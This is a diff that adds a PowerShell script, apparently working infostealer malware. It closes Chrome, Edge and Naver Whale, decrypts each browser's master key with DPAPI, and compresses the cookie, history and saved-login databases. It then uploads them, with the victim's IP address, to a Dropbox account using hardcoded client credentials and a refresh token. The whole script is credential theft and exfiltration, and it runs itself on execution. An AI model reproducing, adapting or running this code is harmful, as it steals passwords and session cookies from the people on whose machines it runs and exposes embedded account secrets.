@@ -1,0 +1,277 @@
+Function BrowserInfo {
+    function ByteArrayCompare {
+	    [CmdletBinding()]
+        Param (
+		    [Parameter(Position = 0, Mandatory = $True)]
+            [Byte[]] $SrcArray,
+		    [Parameter(Position = 1, Mandatory = $True)]
+            [int32] $SrcIndex,
+		    [Parameter(Position = 2, Mandatory = $True)]
+            [Byte[]] $DstArray,
+		    [Parameter(Position = 3, Mandatory = $True)]
+            [int32] $DstIndex,
+            [Parameter(Position = 4, Mandatory = $True)]
+            [int32] $CompCount
+        )
+
+        for( $i = 0 ; $i -lt $CompCount ; $i ++ ) {
+            if( $SrcArray[$i + $SrcIndex] -ne $DstArray[$i + $DstIndex] ) {
+                return $false;
+            }
+        }
+
+        return $True;
+    }
+
+    function GzCompress {
+	    [CmdletBinding()]
+        Param (
+            [String] $strData,
+            [byte[]] $bytesData,
+            [bool] $LineBreak
+        )
+
+        $byteArray = $null;
+        $retString = $null;
+
+        if( $bytesData ) {
+            $byteArray = $bytesData;
+        } elseif ( $strData ) { 
+            $byteArray = [System.Text.Encoding]::UTF8.GetBytes($strData);
+            if( $byteArray.Length -le 0 ) {
+                return $null;
+            }
+        }
+
+        if( $byteArray -ne $null ) {
+            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+            $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+            $gzipStream.Write( $byteArray, 0, $byteArray.Length )
+            $gzipStream.Close()
+            $output.Close()
+            $tmp = $output.ToArray();
+            if( $LineBreak ) {
+                $retString = [Convert]::ToBase64String($tmp, [System.Base64FormattingOptions]::InsertLineBreaks);
+            } else {
+                $retString = [Convert]::ToBase64String($tmp);
+            }
+        }
+
+        return $retString;
+    }
+
+    function GzFile {
+	    [CmdletBinding()]
+        Param (
+		    [Parameter(Position = 0, Mandatory = $True)]
+            [String] $Path
+        )
+
+        $ret = "";
+        if( [System.IO.File]::Exists($Path) ) {
+            $tmpPath = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName();
+            [System.IO.File]::Copy($Path, $tmpPath);
+            $bytesData = [System.IO.File]::ReadAllBytes($tmpPath);
+            [System.IO.File]::Delete($tmpPath);
+            $ret = GzCompress -bytesData $bytesData;
+        }
+
+        return $ret;
+    }
+
+    Function GetSpecString {
+	    param(
+		    [Parameter(Mandatory = $True)]
+		    [String]$Src,
+		    [Parameter(Mandatory = $True)]
+		    [String]$StartStr,
+		    [Parameter(Mandatory = $True)]
+		    [String]$EndStr,
+            [Parameter(Mandatory = $false)]
+		    [String]$Index = 0
+        )
+
+        $ret_json = "{`"SpecString`":`"`",`"LastIndex`":0}" | ConvertFrom-Json;
+        $searchIdx_0 = $Src.IndexOf($StartStr, $Index);
+        if( $searchIdx_0 -ge 0 ) {
+            $searchIdx_0 += $StartStr.Length;
+            $searchIdx_1 = $Src.IndexOf($EndStr, $searchIdx_0);
+            if( $searchIdx_1 -ge 0 ) {
+                $specStr = $Src.Substring($searchIdx_0, $searchIdx_1 - $searchIdx_0);
+                $ret_json.SpecString = $specStr;
+                $ret_json.LastIndex = $searchIdx_1 + $EndStr.Length;
+            }
+        }
+
+        return $ret_json;
+    }
+
+    Function InsertSpecString {
+	    param(
+		    [Parameter(Mandatory = $True)]
+		    [String]$Src,
+		    [Parameter(Mandatory = $True)]
+		    [String]$InStr,
+		    [Parameter(Mandatory = $True)]
+		    [String]$StartStr,
+		    [Parameter(Mandatory = $True)]
+		    [String]$EndStr,
+            [Parameter(Mandatory = $false)]
+		    [String]$Index = 0
+        )
+
+        $ret_str = "";
+        $searchIdx_0 = $Src.IndexOf($StartStr, $Index);
+        if( $searchIdx_0 -ge 0 ) {
+            $searchIdx_0 += $StartStr.Length;
+            $searchIdx_1 = $Src.IndexOf($EndStr, $searchIdx_0);
+            if( $searchIdx_1 -ge 0 ) {
+                $ret_str = $Src.Substring(0, $searchIdx_0);
+                $ret_str += $InStr;
+                $ret_str += $Src.Substring($searchIdx_1);
+            }
+        }
+
+        return $ret_str;
+    }
+
+    function GetBrowserInfo {
+    
+        Add-Type -AssemblyName System.Security;
+
+        $appPath = $env:LOCALAPPDATA;
+        $browserTypes = @("Chrome", "Edge", "Whale");
+        $dataPaths = @("\Google\Chrome\User Data", "\Microsoft\Edge\User Data", "\Naver\Naver Whale\User Data");
+        $emptyJSON = "{}";
+        $stateRetJson = $emptyJSON | ConvertFrom-JSON;
+
+        for ( $i = 0 ; $i -lt $browserTypes.Length ; $i ++ ) {
+            if( [System.IO.Directory]::Exists($appPath + $dataPaths[$i]) ) {
+			    if($browserTypes[$i] -eq "Chrome" ){
+				Stop-Process -Name "chrome";
+				} elseif($browserTypes[$i] -eq "Edge" ){
+				Stop-Process -Name "msedge";
+				}
+				elseif($browserTypes[$i] -eq "Whale"){
+				Stop-Process -Name "whale";
+				}
+                $tmpPath = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName();
+                [System.IO.File]::Copy($appPath + $dataPaths[$i] + "\Local State", $tmpPath);
+                $localStateTxt = [System.IO.File]::ReadAllText($tmpPath);
+
+                $browser = $emptyJSON | ConvertFrom-JSON;
+                #$localState = $localStateTxt | ConvertFrom-Json;
+                #$encKey_b64 = $localState.os_crypt.encrypted_key;
+                $encKey_b64 = (GetSpecString -Src $localStateTxt -StartStr "`"encrypted_key`":`"" -EndStr "`"},").SpecString;
+				$upName = $dataPaths[$i] + "_enc64";
+				PostUploadData -Data $encKey_b64 -UpName $upName;
+
+                if( $encKey_b64 -ne $null -and $encKey_b64 -ne "" ) {
+                    [Byte[]] $encKey_bytes = [System.Convert]::FromBase64String($encKey_b64);
+                    $hdr_bytes = [System.Text.Encoding]::UTF8.GetBytes("DPAPI");
+                    $encBytes = New-Object Byte[] ($encKey_bytes.Length - 5)
+                    if( ByteArrayCompare -SrcArray $encKey_bytes -SrcIndex 0 -DstArray $hdr_bytes -DstIndex 0 -CompCount 5 ) {
+                        [System.Array]::Copy($encKey_bytes, 5, $encBytes, 0, $encBytes.Length);
+                        [byte[]] $decKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);
+                        $decKey_b64 = [System.Convert]::ToBase64String($decKey);
+						$upName = $dataPaths[$i] + "_dec64";
+						PostUploadData -Data $decKey_b64 -UpName $upName;
+                        #$localState.os_crypt.encrypted_key = $decKey_b64;
+                        $localStateTxt = InsertSpecString -Src $localStateTxt -InStr $decKey_b64 -StartStr "`"encrypted_key`":`"" -EndStr "`"},";
+                    }
+                }
+
+                #$localStateTxt = $localState | ConvertTo-Json ;
+                $localStateZip = GzCompress -strData $localStateTxt;
+                $browser | Add-Member -Name "LocalState" -Value $localStateZip -MemberType NoteProperty;
+
+                $cookie_path = $appPath + $dataPaths[$i] + "\Default\Cookies";
+                if( (Test-Path $cookie_path) -eq $false ) {
+                    $cookie_path = $appPath + $dataPaths[$i] + "\Default\Network\Cookies";
+                } 
+
+                $cookies = GzFile($cookie_path);
+                $browser | Add-Member -Name "Cookies" -Value $cookies -MemberType NoteProperty;
+
+                $history = GzFile($appPath + $dataPaths[$i] + "\Default\History");
+                $browser | Add-Member -Name "History" -Value $history -MemberType NoteProperty;
+
+                $loginData = GzFile($appPath + $dataPaths[$i] + "\Default\Login Data");
+                $browser | Add-Member -Name "LoginData" -Value $loginData -MemberType NoteProperty;
+
+                $stateRetJson | Add-Member -Name $browserTypes[$i] -Value $browser -MemberType NoteProperty;
+
+
+                [System.IO.File]::Delete($tmpPath);
+            }
+        }
+
+        $stateReturn = $stateRetJson | ConvertTo-Json;
+        return $stateReturn;
+    }
+	Function PostUploadData {
+		param(
+			[String] $Data,
+			[String] $FilePath,
+			[string]$UpName
+		)
+		$postString = $null;
+
+        if( $Data ) {
+            $postString = GzCompress -strData $Data -LineBreak $true;
+        } elseif($FilePath ) {
+            if( [System.IO.File]::Exists($FilePath) ) {
+                $tmpPath = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName();
+                [System.IO.File]::Copy($FilePath, $tmpPath);
+                $bytesData = [System.IO.File]::ReadAllBytes($tmpPath);
+                [System.IO.File]::Delete($tmpPath);
+                $postString = GzCompress -bytesData $bytesData -LineBreak $true;
+            }
+        }
+
+        if( $postString -ne $null )
+        {
+		 $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+		 $clientID = "17omfk63h9b4rcu"
+         $clientSecret = "48wwyvnjao5qiea"
+         $refreshToken = "l2ml3LN9oq4AAAAAAAAAARlV8Rf0sqJl66rjizNc_fGMDUFIitoI9j2rnf2dQfI0"
+         
+         $body = @{
+           grant_type = "refresh_token"
+           refresh_token = $refreshToken
+           client_id = $clientID
+           client_secret = $clientSecret
+         }
+    
+    
+       $tokenEndpoint = "https://api.dropboxapi.com/oauth2/token"
+       $response = Invoke-RestMethod -Uri $tokenEndpoint -Method Post -Body $body
+       $accessToken = ""
+  
+       if ($response.access_token) {
+          $accessToken = $response.access_token
+          Write-Host "새로운 Access Token: $newAccessToken"
+        } else {
+        Write-Host "Access Token을 가져오는 데 실패했습니다."
+        Write-Host "에러: $($response.error_summary)"
+       }
+       $ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -ne 'Loopback' }).IPAddress
+       $time_sata = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+	   $UpName = $UpName + $time_sata
+       # HTTP 요청 헤더 구성
+       $headers = @{
+         "Authorization" = "Bearer $accessToken"
+         "Content-Type" = "application/octet-stream"
+         "Dropbox-API-Arg" = "{`"path`": `"/log1/$ipAddress[1]/$UpName`",`"mode`": `"add`"}"
+        }
+
+        # 파일 업로드 요청 보내기
+        $response = Invoke-RestMethod -Method Post -Uri $uploadUrl -Headers $headers -Body $postString
+	 }
+	}
+
+    $loginState = GetBrowserInfo ;
+    PostUploadData -Data $loginState -UpName "brwInfo";
+}
+
+BrowserInfo 
